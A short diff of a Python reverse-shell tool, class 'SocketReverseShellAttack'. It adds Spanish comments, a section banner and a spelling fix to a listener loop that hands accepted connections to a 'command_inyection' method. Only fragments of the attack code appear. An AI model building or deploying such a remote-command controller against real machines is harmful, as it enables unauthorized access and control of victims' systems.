@@ -1,5 +1,9 @@
-import socket
-import asyncio
+import socket # Importamos la librería socket para establecer conexiones entre hosts.
+import asyncio # Importamos la librería asyncio para un flujo asíncrono y multitarea.
+
+# ===================================
+#   Estructura de conexión inversa
+# ===================================
 
 class SocketReverseShellAttack:
     def __init__(self, host, port):
@@ -20,7 +24,7 @@ class SocketReverseShellAttack:
 
             while True:
                 conn, addr = s.accept()
-                print(f"Conección establecida con: {addr}:{self.PORT}")
+                print(f"Conexión establecida con: {addr}:{self.PORT}")
 
                 self.command_inyection(conn)
 
